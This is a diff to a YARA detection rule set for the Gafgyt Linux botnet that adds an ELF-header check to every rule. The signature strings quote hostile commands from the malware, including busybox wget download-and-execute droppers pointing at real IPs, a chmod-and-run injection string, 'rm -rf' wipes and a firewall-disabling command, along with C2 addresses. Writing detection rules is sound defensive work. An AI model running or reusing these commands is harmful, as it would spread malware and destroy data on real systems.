@@ -22,6 +22,7 @@ rule Backdoor_Linux_Gafgyt_A_2147755852_0
         $x_1_7 = "lololololol" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((4 of ($x_1_*))) or
             ((1 of ($x_2_*) and 2 of ($x_1_*))) or
@@ -50,6 +51,7 @@ rule Backdoor_Linux_Gafgyt_B_2147760526_0
         $x_1_4 = "/killallbots" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
             ((2 of ($x_2_*))) or
@@ -78,6 +80,7 @@ rule Backdoor_Linux_Gafgyt_C_2147763184_0
         $x_1_4 = "FAST-WebCrawler" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -101,6 +104,7 @@ rule Backdoor_Linux_Gafgyt_D_2147763335_0
         $x_1_3 = "ncorrect" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -127,6 +131,7 @@ rule Backdoor_Linux_Gafgyt_2147764082_0
         $x_1_5 = "sendSTDHEX " ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -155,6 +160,7 @@ rule Backdoor_Linux_Gafgyt_2147764082_1
         $x_1_7 = "Someone tried to kill the bots! Check logs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (5 of ($x*))
 }
 
@@ -182,6 +188,7 @@ rule Backdoor_Linux_Gafgyt_2147764152_0
         $x_1_6 = "rm -rf /tmp/* /var/* /var/run/* /var/tmp/*" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (5 of ($x*))
 }
 
@@ -207,6 +214,7 @@ rule Backdoor_Linux_Gafgyt_2147764330_0
         $x_1_4 = "killer_kill_by_port" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -235,6 +243,7 @@ rule Backdoor_Linux_Gafgyt_2147764417_0
         $x_1_7 = "http_attack" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -267,6 +276,7 @@ rule Backdoor_Linux_Gafgyt_2147765041_0
         $x_1_11 = "rand_cmwc" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -292,6 +302,7 @@ rule Backdoor_Linux_Gafgyt_2147765042_0
         $x_1_4 = "SendSTDHEX" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -316,6 +327,7 @@ rule Backdoor_Linux_Gafgyt_2147765233_0
         $x_1_3 = "Amakano.mpsl%3B+chmod+777+Amakano.mpsl%3B+.%2FAmakano.mpsl+linksys%60&action=&ttcp" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -340,6 +352,7 @@ rule Backdoor_Linux_Gafgyt_AF_2147766300_0
         $x_1_4 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_1_*))) or
             ((1 of ($x_2_*))) or
@@ -368,6 +381,7 @@ rule Backdoor_Linux_Gafgyt_AH_2147767059_0
         $x_2_4 = "vseattack" ascii //weight: 2
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -396,6 +410,7 @@ rule Backdoor_Linux_Gafgyt_AI_2147767628_0
         $x_2_8 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii //weight: 2
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((5 of ($x_1_*))) or
             ((1 of ($x_2_*) and 3 of ($x_1_*))) or
@@ -426,6 +441,7 @@ rule Backdoor_Linux_Gafgyt_AJ_2147767824_0
         $x_1_4 = "SENDBOTSTO" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((3 of ($x_1_*))) or
             ((1 of ($x_3_*))) or
@@ -453,6 +469,7 @@ rule Backdoor_Linux_Gafgyt_AK_2147769604_0
         $x_1_3 = "cowffxxna scanner.%s" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -479,6 +496,7 @@ rule Backdoor_Linux_Gafgyt_AL_2147769608_0
         $x_1_3 = "STOPPING TELNET SCANNER" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_1_*))) or
             ((1 of ($x_2_*))) or
@@ -506,6 +524,7 @@ rule Backdoor_Linux_Gafgyt_E_2147779866_0
         $x_1_4 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -535,6 +554,7 @@ rule Backdoor_Linux_Gafgyt_E_2147779866_1
         $x_1_10 = "B0TK1ll" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((4 of ($x_1_*))) or
             ((1 of ($x_2_*) and 2 of ($x_1_*))) or
@@ -564,6 +584,7 @@ rule Backdoor_Linux_Gafgyt_BB_2147784139_0
         $x_1_4 = "busybox+wget+http://34.80.131.135/bins/telnet.arm+-O+/tmp/gaf;sh+/tmp/gaf+gpon80" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -587,6 +608,7 @@ rule Backdoor_Linux_Gafgyt_D_2147789482_0
         $x_1_3 = "HTTPSTOMP" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -618,6 +640,7 @@ rule Backdoor_Linux_Gafgyt_E_2147789483_0
         $x_1_8 = "[%d.%d.%d.%d:23] [%s:%s] [%s] [Status:%s] [Method:%d] [Attempt #%d" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((5 of ($x_1_*))) or
             ((1 of ($x_3_*) and 2 of ($x_1_*))) or
@@ -646,6 +669,7 @@ rule Backdoor_Linux_Gafgyt_F_2147789484_0
         $x_2_4 = "/tmp/t.sh; chmod 777 /tmp/t.sh; /tmp/t.sh; /bin/busybox wget http://46.243.189.101/t.sh -O - > /tmp/t.sh" ascii //weight: 2
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
             ((2 of ($x_2_*))) or
@@ -675,6 +699,7 @@ rule Backdoor_Linux_Gafgyt_G_2147793393_0
         $x_1_4 = "sendJUNK" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -698,6 +723,7 @@ rule Backdoor_Linux_Gafgyt_G_2147793393_1
         $x_1_3 = "lXfYC7TFaCq5Hv982wuIiKcHlgFA0jEsW2OFQStO7x6zN9dBgayyWgvbk0L3lZClzJCmFG3GVNDFc2iTHNYy7gss8dHboBdeKE1VcblH1AxrVyiqokw2RYFvd4cd1QxyaHawwP6go9" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -723,6 +749,7 @@ rule Backdoor_Linux_Gafgyt_I_2147793892_0
         $x_1_5 = {2e 6d 69 70 73 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 68 6d 6f 64 20 2b 78 20 2f 74 6d 70 2f 2e [0-5] 3b 20 2f 74 6d 70 2f [0-5] 20 68 75 61 77 65 69 2e 6d 69 70 73}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_1_*))) or
             ((1 of ($x_2_*))) or
@@ -751,6 +778,7 @@ rule Backdoor_Linux_Gafgyt_J_2147793955_0
         $x_1_4 = "service firewalld stop" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -781,6 +809,7 @@ rule Backdoor_Linux_Gafgyt_K_2147793956_0
         $x_1_10 = "Bricking All The Skids Bots" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -807,6 +836,7 @@ rule Backdoor_Linux_Gafgyt_L_2147793957_0
         $x_1_6 = "scanner_pause_process" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -830,6 +860,7 @@ rule Backdoor_Linux_Gafgyt_M_2147793958_0
         $x_1_3 = "sendTCP" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -854,6 +885,7 @@ rule Backdoor_Linux_Gafgyt_N_2147793959_0
         $x_1_4 = "TCP | TCP Flood | tcp <ip> <port> <second(s)> <flag(s)" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -878,6 +910,7 @@ rule Backdoor_Linux_Gafgyt_O_2147794034_0
         $x_1_4 = "sendCNC" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -907,6 +940,7 @@ rule Backdoor_Linux_Gafgyt_P_2147794035_0
         $x_1_9 = "tcp_flood" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -932,6 +966,7 @@ rule Backdoor_Linux_Gafgyt_Q_2147794036_0
         $x_1_5 = "UDP Flooding %s for %d seconds" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -964,6 +999,7 @@ rule Backdoor_Linux_Gafgyt_R_2147794037_0
         $x_5_12 = "[UDP@DDoS] Flooding %s for %d seconds" ascii //weight: 5
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((7 of ($x_1_*))) or
             ((1 of ($x_5_*) and 2 of ($x_1_*))) or
@@ -994,6 +1030,7 @@ rule Backdoor_Linux_Gafgyt_S_2147794038_0
         $x_2_5 = {63 64 20 2f 74 6d 70 3b 20 62 75 73 79 62 6f 78 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-48] 2f 6c 6f 6c 69 2e 73 68 3b 20 63 68 6d 6f 64 20 37 37 37 20 6c 6f 6c 69 2e 73 68}  //weight: 2, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 3 of ($x_1_*))) or
             ((1 of ($x_3_*) and 2 of ($x_1_*))) or
@@ -1032,6 +1069,7 @@ rule Backdoor_Linux_Gafgyt_T_2147794039_0
         $x_1_13 = "xXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1056,6 +1094,7 @@ rule Backdoor_Linux_Gafgyt_U_2147794040_0
         $x_1_4 = {63 64 20 2f 74 6d 70 3b 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f [0-16] 2e 73 68 3b 20 63 68 6d 6f 64 20 37 37 37 20 2a 3b 20 73 68 20 [0-16] 2e 73 68}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1084,6 +1123,7 @@ rule Backdoor_Linux_Gafgyt_Dj_2147795311_0
         $x_1_8 = "sendTCP" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (7 of ($x*))
 }
 
@@ -1111,6 +1151,7 @@ rule Backdoor_Linux_Gafgyt_Dr_2147795312_0
         $x_1_7 = "std_send" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (6 of ($x*))
 }
 
@@ -1140,6 +1181,7 @@ rule Backdoor_Linux_Gafgyt_Do_2147795313_0
         $x_1_9 = "UDPFLOOD" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (8 of ($x*))
 }
 
@@ -1165,6 +1207,7 @@ rule Backdoor_Linux_Gafgyt_W_2147797445_0
         $x_1_5 = {55 89 e5 83 ec 10 8b 45 08 a3 80 43 05 08 8b 45 08 2d 47 86 c8 61 a3 84 43 05 08 8b 45 08 05 72 f3 6e 3c a3 88 43 05 08 c7 45 fc 03 00 00 00 eb 33}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -1187,6 +1230,7 @@ rule Backdoor_Linux_Gafgyt_T_2147807669_0
         $x_1_2 = {ff 42 30 92 00 c2 a7 1c 00 c0 af 18 80 82 8f a0 00 c3 27 ?? ?? 42 24 c4 00 06 24 21 20 60 00 21 28 40 00 64 84 99}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -1212,6 +1256,7 @@ rule Backdoor_Linux_Gafgyt_SC_2147808330_0
         $x_1_5 = "[37mCipher" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -1239,6 +1284,7 @@ rule Backdoor_Linux_Gafgyt_2147809149_0
         $x_1_6 = "Infected By Akuryo Botnet Made By ur0a" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1267,6 +1313,7 @@ rule Backdoor_Linux_Gafgyt_H_2147812807_0
         $x_1_8 = "UDP-CHECK-IPPROTO_UDP" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (6 of ($x*))
 }
 
@@ -1292,6 +1339,7 @@ rule Backdoor_Linux_Gafgyt_X_2147813595_0
         $x_1_5 = "UPDDPDP" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((3 of ($x_1_*))) or
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
@@ -1320,6 +1368,7 @@ rule Backdoor_Linux_Gafgyt_Y_2147813597_0
         $x_1_4 = "BQRuQRsQRyQRBQRoQRx" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1343,6 +1392,7 @@ rule Backdoor_Linux_Gafgyt_Z_2147813598_0
         $x_1_3 = "UQZDQZP" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1372,6 +1422,7 @@ rule Backdoor_Linux_Gafgyt_AA_2147813599_0
         $x_1_9 = "LPDIPDLPDBPDIPDTPDCPDH" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1397,6 +1448,7 @@ rule Backdoor_Linux_Gafgyt_AM_2147814366_0
         $x_1_5 = "7ujMko0admin" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1421,6 +1473,7 @@ rule Backdoor_Linux_Gafgyt_AI_2147814700_0
         $x_1_4 = "udpplain" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1445,6 +1498,7 @@ rule Backdoor_Linux_Gafgyt_AN_2147815435_0
         $x_1_4 = "killed pid:" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1469,6 +1523,7 @@ rule Backdoor_Linux_Gafgyt_AC_2147815779_0
         $x_1_4 = "JTSUTSNTSK" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1492,6 +1547,7 @@ rule Backdoor_Linux_Gafgyt_AJ_2147815781_0
         $x_1_3 = "BQZOQZTQZKQZIQZLQZL" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1515,6 +1571,7 @@ rule Backdoor_Linux_Gafgyt_AF_2147815782_0
         $x_1_3 = "UTSDTSP" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1538,6 +1595,7 @@ rule Backdoor_Linux_Gafgyt_AD_2147815783_0
         $x_1_3 = "UQRDQRP" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1562,6 +1620,7 @@ rule Backdoor_Linux_Gafgyt_AW_2147815944_0
         $x_1_4 = "32mStarting Scanner" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((3 of ($x_1_*))) or
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
@@ -1591,6 +1650,7 @@ rule Backdoor_Linux_Gafgyt_A_2147816093_0
         $x_1_5 = "Killed %d Attacks" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -1615,6 +1675,7 @@ rule Backdoor_Linux_Gafgyt_AB_2147816095_0
         $x_1_4 = "UT@$SDT@$SP" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1641,6 +1702,7 @@ rule Backdoor_Linux_Gafgyt_AH_2147816096_0
         $x_1_6 = "GT@$SET@$STT@$SLT@$SOT@$SCT@$SAT@$SLT@$SIT@$SP" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1665,6 +1727,7 @@ rule Backdoor_Linux_Gafgyt_AG_2147816097_0
         $x_1_4 = "main_instance_kill" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1688,6 +1751,7 @@ rule Backdoor_Linux_Gafgyt_AL_2147816098_0
         $x_1_3 = "KGSVYGXA" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1712,6 +1776,7 @@ rule Backdoor_Linux_Gafgyt_AO_2147816100_0
         $x_1_4 = "HTSOTSOTSDTSATSSTSSTSSTSHTSITST" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 2 of ($x_1_*))) or
             (all of ($x*))
@@ -1739,6 +1804,7 @@ rule Backdoor_Linux_Gafgyt_AP_2147816102_0
         $x_1_4 = "GQREQRTQRSQRPQROQROQRFQRS" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 2 of ($x_1_*))) or
             (all of ($x*))
@@ -1766,6 +1832,7 @@ rule Backdoor_Linux_Gafgyt_AM_2147816104_0
         $x_1_4 = "PDrPDmPD PD-PDrPDfPD PDzPD" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -1789,6 +1856,7 @@ rule Backdoor_Linux_Gafgyt_AS_2147816106_0
         $x_1_3 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1814,6 +1882,7 @@ rule Backdoor_Linux_Gafgyt_AS_2147816106_1
         $x_1_5 = "LQZIQZLQZBQZIQZTQZCQZH" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -1839,6 +1908,7 @@ rule Backdoor_Linux_Gafgyt_AO_2147816312_0
         $x_1_5 = "hunt5759" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1868,6 +1938,7 @@ rule Backdoor_Linux_Gafgyt_AX_2147816314_0
         $x_1_9 = "TCPSLAM" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -1893,6 +1964,7 @@ rule Backdoor_Linux_Gafgyt_AR_2147816315_0
         $x_1_5 = "185.244.25.155:443" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1917,6 +1989,7 @@ rule Backdoor_Linux_Gafgyt_AT_2147816316_0
         $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -1943,6 +2016,7 @@ rule Backdoor_Linux_Gafgyt_BF_2147816317_0
         $x_1_6 = "nf1dk5a8eisr9i32" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_4_*) and 2 of ($x_1_*))) or
             (all of ($x*))
@@ -1974,6 +2048,7 @@ rule Backdoor_Linux_Gafgyt_AQ_2147816318_0
         $x_1_8 = "attack_stop" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (6 of ($x*))
 }
 
@@ -1999,6 +2074,7 @@ rule Backdoor_Linux_Gafgyt_BE_2147816319_0
         $x_1_5 = "TELNET ON | OFF" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2024,6 +2100,7 @@ rule Backdoor_Linux_Gafgyt_AP_2147816320_0
         $x_1_5 = {48 54 54 50 [0-5] 46 6c 6f 6f 64 69 6e 67}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -2049,6 +2126,7 @@ rule Backdoor_Linux_Gafgyt_AS_2147816321_0
         $x_1_5 = "TELSCANNER" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_5_*) and 3 of ($x_1_*))) or
             (all of ($x*))
@@ -2076,6 +2154,7 @@ rule Backdoor_Linux_Gafgyt_BD_2147816322_0
         $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2100,6 +2179,7 @@ rule Backdoor_Linux_Gafgyt_AR_2147816323_0
         $x_1_4 = "U*^D*^P" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2125,6 +2205,7 @@ rule Backdoor_Linux_Gafgyt_AT_2147816324_0
         $x_1_5 = "FQRUQRCQRKQROQRFQRF" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -2150,6 +2231,7 @@ rule Backdoor_Linux_Gafgyt_AU_2147816325_0
         $x_1_5 = "L*^U*^C*^K*^Y*^L*^I*^L*^D*^U*^D*^E" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -2172,6 +2254,7 @@ rule Backdoor_Linux_Gafgyt_AE_2147816435_0
         $x_2_2 = {48 8b 45 e8 48 89 85 d0 fe ff ff 48 c7 85 c8 fe ff ff [0-5] 48 c7 85 c0 fe ff ff 04 00 00 00 fc 48 8b b5 d0 fe ff ff 48 8b bd c8 fe ff ff 48 8b 8d c0 fe ff ff f3 a6 0f 97 c2 0f 92 c0 89 d1 28 c1 89 c8 0f be c0 85 c0 75 0e 48 8b 45 d8 0f b6 50 0d 83 ca 08 88}  //weight: 2, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2197,6 +2280,7 @@ rule Backdoor_Linux_Gafgyt_AN_2147816819_0
         $x_1_5 = "hlLjztqZ" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 3 of ($x_1_*))) or
             (all of ($x*))
@@ -2229,6 +2313,7 @@ rule Backdoor_Linux_Gafgyt_AX_2147817170_0
         $x_1_9 = "hlLjztqZ" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 2 of ($x_1_*))) or
             ((2 of ($x_2_*))) or
@@ -2256,6 +2341,7 @@ rule Backdoor_Linux_Gafgyt_AY_2147817236_0
         $x_1_3 = "TCPFLOOD" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2282,6 +2368,7 @@ rule Backdoor_Linux_Gafgyt_AZ_2147817555_0
         $x_1_6 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -2306,6 +2393,7 @@ rule Backdoor_Linux_Gafgyt_BB_2147817556_0
         $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2331,6 +2419,7 @@ rule Backdoor_Linux_Gafgyt_BB_2147817556_1
         $x_1_5 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -2354,6 +2443,7 @@ rule Backdoor_Linux_Gafgyt_BC_2147817831_0
         $x_1_3 = "busybox wget" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2379,6 +2469,7 @@ rule Backdoor_Linux_Gafgyt_BA_2147817853_0
         $n_1_5 = "com.bitdefender" ascii //weight: -1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (not (any of ($n*))) and
         (all of ($x*))
 }
@@ -2407,6 +2498,7 @@ rule Backdoor_Linux_Gafgyt_BG_2147817855_0
         $x_1_7 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 3 of ($x_1_*))) or
             ((2 of ($x_2_*) and 1 of ($x_1_*))) or
@@ -2434,6 +2526,7 @@ rule Backdoor_Linux_Gafgyt_F_2147818207_0
         $x_2_3 = "80.211.75.35" ascii //weight: 2
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2457,6 +2550,7 @@ rule Backdoor_Linux_Gafgyt_F_2147818207_1
         $x_1_4 = {31 c0 ff c0 80 75 00 ?? 48 ff c5 41 39 c4 75 f2}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2483,6 +2577,7 @@ rule Backdoor_Linux_Gafgyt_G_2147818208_0
         $x_1_7 = "[0m Wtf is this shit: %s" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -2508,6 +2603,7 @@ rule Backdoor_Linux_Gafgyt_F_2147818247_0
         $x_1_5 = "bins/akame." ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2533,6 +2629,7 @@ rule Backdoor_Linux_Gafgyt_BD_2147818273_0
         $x_1_5 = "KILLATT" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 3 of ($x_1_*))) or
             ((1 of ($x_3_*) and 2 of ($x_1_*))) or
@@ -2562,6 +2659,7 @@ rule Backdoor_Linux_Gafgyt_BF_2147818274_0
         $x_1_4 = "hlLjztqZ" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_2_*) and 1 of ($x_1_*))) or
             (all of ($x*))
